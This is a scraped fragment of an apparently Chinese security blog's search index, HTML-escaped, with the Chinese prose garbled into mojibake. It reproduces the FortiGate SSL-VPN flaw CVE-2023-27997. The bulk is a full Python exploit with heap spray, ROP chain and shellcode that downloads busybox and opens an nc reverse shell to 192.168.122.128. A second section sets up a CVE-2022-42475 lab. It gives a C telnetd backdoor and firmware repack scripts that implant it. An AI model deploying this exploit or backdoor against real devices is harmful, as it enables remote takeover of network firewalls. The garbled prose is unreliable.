0x7f146c2f3040: 0x6a0252dd8edeb094      0x069d945198969402
pwndbg&amp;gt; dist 0x7f146c2f3000 0x00007f146c2f4000
0x7f146c2f3000-&amp;gt;0x7f146c2f4000 is 0x1000 bytes (0x200 words)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ÊºèÊ¥ûÂà©Áî®&#34;&gt;ÊºèÊ¥ûÂà©Áî®:&lt;/h2&gt;
&lt;h3 id=&#34;Â†ÜÊéíÂ∏É&#34;&gt;Â†ÜÊéíÂ∏É:&lt;/h3&gt;
&lt;p&gt;Êñ≠ÁÇπ‰∏ãÂú®&lt;code&gt;SSL_new&lt;/code&gt;‰πãÂêéÂçïÊ≠•ÂâçËøõÔºåÂà∞&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;   0x7f147197eb41     call   CRYPTO_zalloc@plt                &amp;lt;CRYPTO_zalloc@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êü•ÁúãÂèØÁü•7.2.1ÁâàÊú¨ÂàÜÈÖçÁöÑsslÁªìÊûÑ‰ΩìÂ§ßÂ∞è‰∏∫0x1db8&lt;br&gt;
Ê†πÊçÆlexfoÂçöÂÆ¢‰∏≠ÁöÑÊÄùË∑ØÔºåÊàë‰ª¨ËøòÊòØÈÄâÊã©Â†ÜÂñ∑Ë¶ÜÁõñ&lt;code&gt;handshake_func&lt;/code&gt;:&lt;br&gt;
https://blog.lexfo.fr/xortigate-cve-2023-27997.html&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Ê≥®ÊÑèÂ†ÜÂñ∑ÈúÄË¶ÅÂú®‰∏ÄÊ¨°sslËØ∑Ê±Ç‰∏≠ÂÆåÊàêÔºåËØ∑Ê±ÇÂÆåÊàêÂêé‰ºöÈáäÊîæÔºå‰ºöÂÜôÂÖ•ÁöÑÊï∞ÊçÆÊ∏Ö0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ª•7.2.1‰∏∫‰æãÔºå‰ª•‰∏ã‰∏∫Â†ÜÂñ∑Ê≠•È™§:&lt;br&gt;
1. ÂàõÂª∫Â§ßÈáèÁöÑsocketËøûÊé•ÔºåÂ°´ÂÖÖbuffer&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151000.png&#34; alt=&#34;Pasted image 20240830151000.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2. Âú®ÂÖ∂‰∏≠‰∏Ä‰∏™socketËøûÊé•ÂèëÈÄÅÂ§ßÈáèÊï∞ÊçÆÔºå‰ΩøhttpËØ∑Ê±ÇÁöÑbufferÈáçÊñ∞ÂàÜÈÖç&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151051.png&#34; alt=&#34;Pasted image 20240830151051.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
3. Âª∫Á´ãÂê´payloadÁöÑsocketËøûÊé•get_saltÂπ∂ÂèëÈÄÅÔºåËØ•socket‰ºöË¢´ÂàÜÈÖçÂà∞ÂàöÊâçfreeÊéâÁöÑbufferÔºåÊ≠§Êó∂Â†ÜÊ∫¢Âá∫ÂÜôÁªìÊûÑ‰ΩìÊåáÈíà&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151308.png&#34; alt=&#34;Pasted image 20240830151308.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
4. ÂÖ∂‰ΩôsocketËøûÊé•ÂèëÈÄÅdataÔºåËß¶ÂèëÂáΩÊï∞ÊåáÈíàÂºïÁî®&lt;/p&gt;
&lt;p&gt;ËøôÈáåÊîπ‰∫ÜÁî®‰∫Ü‰∏Ä‰∏™ÂéüÁîügdbÁöÑloggingÂäüËÉΩÔºåÊâìÂç∞Â≠òÊîækeystreamÁöÑÂú∞ÂùÄÔºàÂíåÂ≠òÊîæHTTPËØ∑Ê±ÇÁöÑÂú∞ÂùÄÁõ∏ÈÇªÔºåÂ∑Æ0x18ÔºâÔºå‰ª•ÂèäÂàÜÈÖçsslÁªìÊûÑ‰ΩìÁöÑÂú∞ÂùÄ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;target remote 192.168.122.99:23
set height 0
set pagination off
set disassembly-flavor intel
handle SIGPIPE nostop
shell rm -f ssl_chunk.txt ssl_obj.txt je_malloc.txt keystream.txt

# break after allocating the buffer grab the address
# b *0x01776baa
# commands
#     set logging file ssl_chunk.txt
#     set logging enable on
#     set $heap_obj = $rax
#     printf &amp;quot;buffer: %p\n&amp;quot;, $heap_obj
#     set logging enable off
#     c
# end
# print address of SSL objects when malloc&#39;d
b *CRYPTO_zalloc+37 if  ( $r12 == 0x1db8 )
commands
    set logging file ssl_obj.txt
    set logging enable on
    printf &amp;quot;CRYPTO_zalloc(0x%x) = %p\n&amp;quot;, $r12, $rax
    set logging enable off
    c
end

# break in je_malloc in case something calls je_malloc directly
b *0x1776baa if (($r13 ==0x2000))
commands
    set logging file je_malloc.txt
    set logging enable on
    printf &amp;quot;je_malloc(0x%x) = %p\n&amp;quot;, $r13 , $rax
    set logging enable off
    c
end

b *0x16adf15 
commands
    set logging file keystream.txt
    set logging enable on
    printf &amp;quot;keystream_loc = %p\n&amp;quot; , $rdx
    set logging enable off
    c
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Â¶ÇÂõæÔºåÊàë‰ª¨Âú®Â†Ü‰∏äÂñ∑Â∞ÑÂ§ßÈáèsocket bufferÂêéËÉΩÂ§üÊ∫¢Âá∫Âà∞ÂÖ∂‰∏≠Êüê‰∏Ä‰∏™sslÁªìÊûÑ‰ΩìÔºå‰øÆÊîπhandshakeÂáΩÊï∞ÊåáÈíàÂπ∂Ë¶ÜÁõñin_init‰∏∫1ÔºåÂä´ÊåÅÊâßË°åÊµÅ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151740.png&#34; alt=&#34;Pasted image 20240830151740.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240901233231.png&#34; alt=&#34;Pasted image 20240901233231.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;payloadÊûÑÈÄ†&#34;&gt;payloadÊûÑÈÄ†:&lt;/h3&gt;
&lt;p&gt;Ê≠§Âàª&lt;code&gt;$rdi,$rbp&lt;/code&gt;ÊåáÂêësslÁªìÊûÑ‰ΩìÂºÄÂ§¥ÔºåÁî±‰∫ésslÁªìÊûÑ‰ΩìÂ≠òÂú®‰∏çÂèØÂÜôÂå∫ÂüüÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®‰ª•‰∏ãgadgetÂ∞ÜÊ†àËøÅÁßªÂà∞out bufferËøõË°årop&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;push_rdi_pop_rsp_ret = 0x98bed1
# 0x000000000098bed1 : push rdi ; pop rsp ; ret Ê†àËøÅÁßªÂà∞sslÁªìÊûÑ‰ΩìËµ∑ÂßãÂú∞ÂùÄ

add_rsp_0xb8_pop_rbx_rbp_ret = 0x2a49fa3
# 0x0000000002a49fa3 : add rsp, 0xb8 ; pop rbx ; pop rbp ; ret

pop_rax_rdx_ret = 0x60bda4
# 0x000000000060bda4 : pop rax ; pop rdx ; ret 8Â≠óËäÇpadding rax , rdx‰∏∫ssl_offset

mov_rax_rdi_sub_rax_rdx_ret = 0x14bd8cf
# 0x00000000014bd8cf : mov rax, rdi ; sub rax, rdx ; ret ÂèñsslÁªìÊûÑ‰ΩìËµ∑ÂßãÂú∞ÂùÄÁªôraxÂπ∂ÂáèÂéªrdxÔºå‰ΩøraxÊåáÂêëoutÂå∫Âüü

push_rax_pop_rsp_ret = 0xe72240
# 0x0000000000e72240 : push rax ; pop rsp ; xor eax, eax ; ret  ËøÅÊ†àÂà∞outÂå∫Âüü
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240902163611.png&#34; alt=&#34;Pasted image 20240902163611.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËøôÈáåÊúÄÂêéÈááÁî®ÁöÑÊòØret2mprotectÁÑ∂ÂêéË∑≥ËΩ¨ÊâßË°åshellcodeÔºåÊâßË°å&lt;code&gt;execlp(&amp;quot;/bin/node&amp;quot;,&amp;quot;node&amp;quot;,&amp;quot;-e&amp;quot;,&amp;quot;...&amp;quot;,NULL)&lt;/code&gt;ÔºåÂç≥ÈÄöËøáfortiosËá™Â∏¶ÁöÑ&lt;code&gt;/bin/node&lt;/code&gt;Á®ãÂ∫èÊâßË°åÂêéÈó®‰∏ãËΩΩ‰ª•ÂèäÂèçÂºπshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from hashlib import md5
from pwn import *
import requests
import time
import ssl
import socket
context.os = &#39;linux&#39;
context.arch = &#39;amd64&#39;

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443

path = &amp;quot;/remote/hostcheck_validate&amp;quot;.encode()


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _default_context.options |= ssl.OP_NO_TLSv1_3
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


def get_salt(sk):
    sk.sendall(b&amp;quot;GET /remote/info HTTP/1.1\r\nHost:&amp;quot;+ip.encode()+b&amp;quot;\r\n\r\n&amp;quot;)
    data = sk.recv(1024)
    # print(data)
    # sk.close()
    salt = data[data.find(b&amp;quot;salt=&amp;quot;)+6:data.find(b&amp;quot;salt=&amp;quot;)+14]
    info(&amp;quot;salt: &amp;quot;+str(salt))
    return salt


def gen_ks(salt, seed, size):
    magic = b&#39;GCC is the GNU Compiler Collection.&#39;
    k0 = md5(salt+seed+magic).digest()
    keystream = k0
    while len(keystream) &amp;lt; size:
        k0 = md5(k0).digest()
        keystream += k0
    return keystream[:size]


def gen_enc_data(salt, seed, size, data):
    plaintext = p16(size) + data
    keystream = gen_ks(salt, seed, len(plaintext))
    ciphertext = xor(plaintext, keystream).hex()
    return seed + ciphertext.encode()


def gen_seed_for_offset(salt, offset, value):
    for i in range(0xffffff):
        seed = &amp;quot;00{0:06x}&amp;quot;.format(i).encode()
        ks = gen_ks(salt, seed, offset+1)
        if int(ks[offset]) == int(value):
            print(&amp;quot;seed found: &amp;quot;+str(seed))
            print(&amp;quot;keystream: &amp;quot;+hex(ks[offset]))
            print(&amp;quot;value: &amp;quot;+str(value))
            print(&amp;quot;offset: &amp;quot;+str(offset))
            return seed
    print(&amp;quot;keystream not found&amp;quot;)
    exit(1)


def gen_seeds_u8(salt, offset, val):
    value = p8(val)
    if val == 0:
        return [(b&#39;00bfbfbf&#39;, offset - 1), (b&#39;00bfbfbf&#39;, offset - 1)]
    s = gen_seed_for_offset(salt, offset, value[0])
    return [(s, offset - 2), (s, offset - 1)]


def gen_seeds_u64(salt, offset, val):
    value = p64(val)
    seeds = []
    n = 7
    for i in range(n, -1, -1):
        if value[i] != 0:
            s = gen_seed_for_offset(salt, offset + i, value[i])
            seeds.append((s, offset + i - 1))
            seeds.append((s, offset + i - 2))
        else:
            seeds.append((b&#39;00bfbfbf&#39;, offset + i - 1))
            seeds.append((b&#39;00bfbfbf&#39;, offset + i - 1))
    return seeds[::-1]


def gen_payload():
    # 0x15ea350  call _execlp
    shellcode = asm(&#39;&#39;&#39;
    lea rdi, [rip+arg1]
    lea rsi, [rip+arg2]
    lea rdx, [rip+arg3]
    lea rcx, [rip+arg4]
    mov r8, 0x0
    mov rax, 0x15ea350
    jmp rax

arg1:
    .string &amp;quot;/bin/node&amp;quot;

arg2:
    .string &amp;quot;node&amp;quot;
    
arg3:
    .string &amp;quot;-e&amp;quot;

arg4:
    .string &amp;quot;const http=require(&#39;http&#39;);const fs=require(&#39;fs&#39;);const {spawn}=require(&#39;child_process&#39;);const fileUrl=&#39;http://192.168.122.128:8000/busybox&#39;;const args=[&#39;nc&#39;, &#39;192.168.122.128&#39;, &#39;1234&#39;, &#39;-e&#39;, &#39;/bin/busybox&#39;, &#39;ash&#39;];const command=&#39;/bin/busybox&#39;;const create=(err) =&amp;gt; {console.log(&#39;i&#39;);};try {fs.chmod(&#39;/bin/busybox&#39;, 0o777, (err) =&amp;gt; {});} catch (err) {};try {fs.symlinkSync(&#39;/bin/busybox&#39;, &#39;/bin/nc&#39;);} catch (err) {};try {fs.unlink(&#39;/bin/nc&#39;, (err)=&amp;gt;{fs.unlink(&#39;/bin/ash&#39;, (err) =&amp;gt; {fs.symlinkSync(&#39;/bin/busybox&#39;, &#39;/bin/ash&#39;);});})}catch (err){};process.on(&#39;uncaughtException&#39;, create);const df=(url, dest) =&amp;gt; {const file=fs.createWriteStream(dest);http.get(url, (response) =&amp;gt; {response.pipe(file);file.on(&#39;finish&#39;, () =&amp;gt; {file.close(() =&amp;gt; {create();});});}).on(&#39;error&#39;, (err) =&amp;gt; {});};const executeFile=(err) =&amp;gt; {const child=spawn(command,args, {stdio: &#39;inherit&#39; });};df(fileUrl, &#39;/bin/busybox&#39;);console.log(&#39;d&#39;);create();executeFile();&amp;quot;
                    &#39;&#39;&#39;)

    push_rsp_pop_rcx_ret = 0x805b38
    # 0x0000000000805b38 : push rsp ; pop rcx ; ret ‰øÆÊîπrcx‰∏∫ÂΩìÂâçÊ†àÊåáÈíà

    push_rcx_pop_rdx_ret = 0x12ce92b
    # 0x00000000012ce92b : push rcx ; pop rdx ; ret ‰øÆÊîπrdx‰∏∫Ê†àÊåáÈíà

    pop_rax_ret = 0x46bb27
    # 0x000000000046bb27 : pop rax ; ret È°µÂÅèÁßªrax 0x26?

    sub_rdx_rax_mov_rax_rdx_ret = 0x285a384
    # 0x000000000285a384 : sub rdx, rax ; mov rax, rdx ; ret rdxÂáèÂéªÈ°µÂÅèÁßª

    push_rdx_pop_rdi_ret = 0x257008a
    # 0x000000000257008a : push rdx ; pop rdi ; ret ‰øÆÊîπrdi‰∏∫Ê†àÊåáÈíà

    pop_rsi_ret = 0x530c8e
    # 0x0000000000530c8e : pop rsi ; ret ÂÜÖÂ≠òÂùóÂ§ßÂ∞è

    pop_rdx_ret = 0x509372
    # 0x0000000000509372 : pop rdx ; ret prot‰Ωç

    mprotect_addr = 0x43f3d0

    add_rax_rdi_ret = 0x7d4f3d
    # 0x00000000007d4f3d : add rax, rdi ; ret

    push_rax_ret = 0x43dccc
    # 0x000000000043dccc : push rax ; ret

    payload = p64(0)
    payload += p64(push_rsp_pop_rcx_ret)
    payload += p64(push_rcx_pop_rdx_ret)
    payload += p64(pop_rax_ret)
    payload += p64(0x2e+0x7e000)
    payload += p64(sub_rdx_rax_mov_rax_rdx_ret)
    payload += p64(push_rdx_pop_rdi_ret)
    payload += p64(pop_rsi_ret)
    payload += p64(0x300000)
    payload += p64(pop_rdx_ret)
    payload += p64(7)
    payload += p64(mprotect_addr)
    # payload += p64(0xdeadbeef)
    payload += p64(pop_rax_ret)
    payload += p64(0x15e+0x7e000)
    payload += p64(add_rax_rdi_ret)
    payload += p64(push_rax_ret)
    payload = payload.ljust(0x150, b&amp;quot;\x90&amp;quot;)
    payload += shellcode

    return payload.ljust(0x2000-0x18-7, b&amp;quot;A&amp;quot;)


def send_payload(_sk, salt, seed, size, data=b&#39;&#39;):
    payload = b&amp;quot;enc=&amp;quot;+gen_enc_data(salt, seed, size, data)
    rq = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: &amp;quot;+ip.encode()+b&amp;quot;\r\nContent-Length: &amp;quot; + \
        str(len(payload)).encode() + \
        b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n&amp;quot;+payload
    _sk.sendall(rq)
    # _sk.recv(1024)


tick = 33

while True:
    tick += 1
    try:
        socks = []

        for i in range(tick):
            sk = create_ssl_ctx()
            data = b&amp;quot;POST &amp;quot; + b&amp;quot;/remote/login&amp;quot; + \
                b&amp;quot; HTTP/1.1\r\nHost: &amp;quot;+ip.encode()+b&amp;quot;\r\nContent-Length: 3\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\na=1&amp;quot;
            sk.sendall(data)
            socks.append(sk)

        socks[-1].send(b&amp;quot;B&amp;quot;*0x2001)

        _sk = create_ssl_ctx()
        salt = get_salt(_sk)

        ssl_offset = 0x2000-0x1e+2
        handshake_func = ssl_offset + 0x30
        in_init = ssl_offset+0x64

        seed = []

        push_rdi_pop_rsp_ret = 0x98bed1
        # 0x000000000098bed1 : push rdi ; pop rsp ; ret Ê†àËøÅÁßªÂà∞sslÁªìÊûÑ‰ΩìËµ∑ÂßãÂú∞ÂùÄ

        add_rsp_0xb8_pop_rbx_rbp_ret = 0x2a49fa3
        # 0x0000000002a49fa3 : add rsp, 0xb8 ; pop rbx ; pop rbp ; ret

        pop_rax_rdx_ret = 0x60bda4
        # 0x000000000060bda4 : pop rax ; pop rdx ; ret 8Â≠óËäÇpadding rax , rdx‰∏∫ssl_offset

        mov_rax_rdi_sub_rax_rdx_ret = 0x14bd8cf
        # 0x00000000014bd8cf : mov rax, rdi ; sub rax, rdx ; ret ÂèñsslÁªìÊûÑ‰ΩìËµ∑ÂßãÂú∞ÂùÄÁªôraxÂπ∂ÂáèÂéªrdxÔºå‰ΩøraxÊåáÂêëoutÂå∫Âüü

        push_rax_pop_rsp_ret = 0xe72240
        # 0x0000000000e72240 : push rax ; pop rsp ; xor eax, eax ; ret  ËøÅÊ†àÂà∞outÂå∫Âüü

        seed.extend(gen_seeds_u64(salt, handshake_func, push_rdi_pop_rsp_ret))
        seed.extend(gen_seeds_u64(salt, ssl_offset, pop_rax_rdx_ret))
        seed.extend(gen_seeds_u64(salt, ssl_offset+0x10, ssl_offset-2-8))
        seed.extend(gen_seeds_u64(salt, ssl_offset +
                    0x18, mov_rax_rdi_sub_rax_rdx_ret))
        seed.extend(gen_seeds_u64(salt, ssl_offset+0x20, push_rax_pop_rsp_ret))

        # seed.extend(gen_seeds_u64(salt, handshake_func, 0xdeadbeefdeadbeef))
        seed.extend(gen_seeds_u8(salt, in_init, 1))

        for i in seed:
            print(i)
            send_payload(_sk, salt, i[0], i[1], gen_payload())
            # send_payload(_sk, salt, i[0], i[1],
            #              b&#39;\x00&#39;*8 + p64(0xdeadbeef) + b&#39;A&#39;*(0x2000-0x18-7-8-8))

        counter = 0
        for i in socks:
            print(counter)
            counter += 1
            i.send(b&amp;quot;a&amp;quot;*0x40)

    except Exception as e:
        print(f&amp;quot;crash: {e}&amp;quot;)
        _sk.close()
        break

&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/27997.gif&#34; alt=&#34;27997.gif&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">CVE-2023-27997 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/PjuPrWzmI/"" data-c="
          &lt;p&gt;Êú¨ÊñáÂ§çÁé∞CVE-2022-42475ÔºåÁâàÊú¨v7.2.1.F-build1254&lt;/p&gt;
&lt;h2 id=&#34;‰∏ãËΩΩÈìæÊé•&#34;&gt;‰∏ãËΩΩÈìæÊé•:&lt;/h2&gt;
&lt;p&gt;https://github.com/hegdepavankumar/Cisco-Images-for-GNS3-and-EVE-NG&lt;/p&gt;
&lt;h2 id=&#34;license&#34;&gt;license :&lt;/h2&gt;
&lt;p&gt;https://github.com/rrrrrrri/fgt-gadgets&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. ËøêË°åpython3 license_old.pyÁîüÊàêÂêéÂâçÂè∞ËÆæÁΩÆÊó∂ÂØºÂÖ•Âç≥ÂèØ
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240806175558.png&#34; alt=&#34;Pasted image 20240806175558.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;Êñ∞ÁâàÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. ÂØºÂÖ•ovfÔºåÂêØÂä®ÂêéÂàùÂßãÂåñËôöÊãüÊú∫ÔºåÈªòËÆ§Áî®Êà∑ÂêçadminÔºåÈªòËÆ§ÂØÜÁ†ÅÁ©∫
2. ÂàùÂßãÂåñÂÆåÊàêÂêéÂÖ≥Êú∫ÔºåÂú®ËôöÊãüÊú∫ÁõÆÂΩï‰∏ãÊúâfo-disk1.vmdkÁîüÊàê
3. Â∞ÜvmdkÊåÇËΩΩÂà∞Âè¶Â§ñ‰∏Ä‰∏™ËôöÊãüÊú∫‰∏≠
4. Êñ∞ÁâàÊâßË°å`python3 decrypt.py -f rootfs.gz -k flatkc`Ëß£ÂØÜrootfs.gz
5. rootÊùÉÈôêËß£Âéãrootfs.gzÂíåbin.tar.xz
	```
	   gzip -d ./dec.gz
       mkdir rootfs
       cd rootfs &amp;amp;&amp;amp; mv ../dec ./
       sudo su
       cpio -idmv &amp;lt; ./dec
       rm -rf ./dec
       xz -d ./bin.tar.xz &amp;amp;&amp;amp; tar -xvf ./bin.tar &amp;amp;&amp;amp; rm -rf ./bin.tar
       cd .. &amp;amp;&amp;amp; mv ./rootfs/bin/init ./
	```
	
6. `python3 patch.py init` patch initÊñá‰ª∂
7. ÈáçÊâìÂåÖ
	```
	   chmod 755 ./init.patched &amp;amp;&amp;amp; mv ./init.patched ./rootfs/bin/init
       cd rootfs
       tar -cvf bin.tar bin &amp;amp;&amp;amp; xz bin.tar &amp;amp;&amp;amp; rm -rf bin
       find . | cpio -H newc -o &amp;gt; ../rootfs.raw &amp;amp;&amp;amp; cd ..
       cat ./rootfs.raw | gzip &amp;gt; rootfs.gz
    ```
    
8. &#39;python3 patch.py flatkc&#39; patch flatkc
9. ÊõøÊç¢ÊéâvmdiskÁöÑrootfs.gzÂíåflatkc
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ÁΩëÁªúÈÖçÁΩÆ&#34;&gt;ÁΩëÁªúÈÖçÁΩÆÔºö&lt;/h2&gt;
&lt;p&gt;https://blog.csdn.net/meigang2012/article/details/87903878&lt;br&gt;
https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#ÈÖçÁΩÆportÂíåip
config system interface
edit port1
set mode static
set ip 192.168.122.99 255.255.255.0
set allowaccess ping https ssh http telnet
end

#ÈÖçÁΩÆÁΩëÂÖ≥
config router static
edit 1
set device port1
set gateway 192.168.122.128
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;VMwareÁΩëÁªúÈÄÇÈÖçÂô®ËÆæÁΩÆ‰∏∫NATÔºåËôöÊãüÁΩëÁªúÁºñËæëÂô®‰øÆÊîπÂ≠êÁΩëip&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240807100542.png&#34; alt=&#34;Pasted image 20240807100542.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËøõÂÖ•ÂêéÂè∞ÂêéÂâçÂæÄSystem/Settings‰øÆÊîπ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240806175558.png&#34; alt=&#34;Pasted image 20240806175558.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
VPN/SSL-VPNÈó®Êà∑&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814105739.png&#34; alt=&#34;Pasted image 20240814105739.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;SSL-VPNËÆæÁΩÆ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240812101642.png&#34; alt=&#34;Pasted image 20240812101642.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;ÈÖçÁΩÆsslvpnÁöÑÈò≤ÁÅ´Â¢ôÁ≠ñÁï•&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240814105636.png&#34; alt=&#34;Pasted image 20240814105636.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;patch&#34;&gt;PatchÔºö&lt;/h2&gt;
&lt;h3 id=&#34;Âõ∫‰ª∂Ëß£ÂåÖÂêéÈó®Ê§çÂÖ•&#34;&gt;Âõ∫‰ª∂Ëß£ÂåÖ&amp;amp;&amp;amp;ÂêéÈó®Ê§çÂÖ•Ôºö&lt;/h3&gt;
&lt;p&gt;ÊõøÊç¢ÂéüÁâà/bin/shËΩØÈìæÊé•‰∏∫ÂäüËÉΩÈΩêÂÖ®ÁöÑÈ¢ÑÁºñËØëbusybox&lt;br&gt;
‰º†ÂÖ•È¢ÑÁºñËØëÁöÑgdbserverÊñπ‰æøË∞ÉËØï&lt;br&gt;
Â∞Ü/bin/smartctlÊõøÊç¢‰∏∫ÂºÄÂêØtelnetÁöÑÂêéÈó®ÔºåÊâßË°å&lt;code&gt;diagnose hardware smartctl&lt;/code&gt;Ëß¶Âèë&lt;br&gt;
ÂêéÈó®backdoor.c:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// gcc -s backdoor.c -o backdoor
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void shell()
{
    system(&amp;quot;/bin/busybox ls&amp;quot;);
    system(&amp;quot;/bin/busybox id&amp;quot;);
    system(&amp;quot;/bin/busybox killall sshd &amp;amp;&amp;amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&amp;quot;);
    system(&amp;quot;/bin/busybox ash --login -s&amp;quot;);
    return;
}

int main(int argc, char const *argv[])
{
    shell();
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êñá‰ª∂Á≥ªÁªüÂ≠òÂú®‰∫égzipÂéãÁº©ÁöÑcpio‰∏≠&lt;br&gt;
ÂÖ∂‰∏≠fs‰∏≠ÁöÑ.tar.xzÁöÑÂéãÁº©ÂåÖÁî±fortigateÈ≠îÊîπÂä†ÂØÜÔºåÈúÄ‰ΩøÁî®sbin/ÁõÆÂΩï‰∏ãÁöÑelfËß£ÂéãÁº©&lt;br&gt;
‰∏ãÈù¢ÁªôÂá∫ÊèêÂèñÂèäÂêéÈó®Ê§çÂÖ•ËÑöÊú¨ÔºåÊõøÊç¢Êñá‰ª∂ÈúÄË∑üËÑöÊú¨Âêå‰∏ÄÁõÆÂΩïÔºårootÊùÉÈôê‰∏ãÊâßË°å&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
echo &amp;quot;ËØ∑Â∞Übackdoor,busybox,gdbserverÁΩÆ‰∫é‰∏éËÑöÊú¨Âêå‰∏ÄÁõÆÂΩï‰∏ã&amp;quot;
chmod +x $PWD/*
mkdir -p $PWD/fs
cp /media/fk/FORTIOS/rootfs.gz $PWD
gzip -d rootfs.gz
cd $PWD/fs
cpio -idmv &amp;lt; ../rootfs
chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
chroot . /sbin/ftar -xf /bin.tar
chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz
chroot . /sbin/ftar -xf /migadmin.tar
chroot . /sbin/xz --check=sha256 -d /usr.tar.xz
chroot . /sbin/ftar -xf /usr.tar
cp ../backdoor bin/smartctl 
cp ../busybox bin/busybox 
cp ../gdbserver* bin/gdbserver
chmod +777 bin/smartctl
chmod +777 bin/busybox
chmod +777 bin/gdbserver
rm bin/sh
ln -sn /bin/busybox bin/sh
echo &amp;quot;ÊâãÂä®patch init...&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;patch initÂêéÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
echo &amp;quot;ËØ∑Â∞ÜinitÁΩÆ‰∫é‰∏éËÑöÊú¨Âêå‰∏ÄÁõÆÂΩï‰∏ã&amp;quot;
sudo cp init fs/bin/init
cd fs
find . | cpio -H newc -o &amp;gt; ../rootfs.raw
cd ..
cat ./rootfs.raw | gzip &amp;gt; rootfs.gz
rm rootfs.raw &amp;amp;&amp;amp; rm rootfs
chmod -R 777 rootfs.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊàñËÄÖ‰ΩøÁî®ËøôÈáåÁöÑauto-repackËÑöÊú¨:&lt;br&gt;
https://github.com/rrrrrrri/fgt-auto-repack/blob/main/automatic_repack.py&lt;/p&gt;
&lt;p&gt;fo.vmx‰øÆÊîπÂºÄÂêØdebugStub&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;debugStub.listen.guest64 = &amp;quot;TRUE&amp;quot;
debugStub.listen.guest64.remote = &amp;quot;TRUE&amp;quot;
debugStub.port.guest64 = &amp;quot;12345&amp;quot;
debugStub.listen.guest32 = &amp;quot;TRUE&amp;quot;
debugStub.listen.guest32.remote = &amp;quot;TRUE&amp;quot;
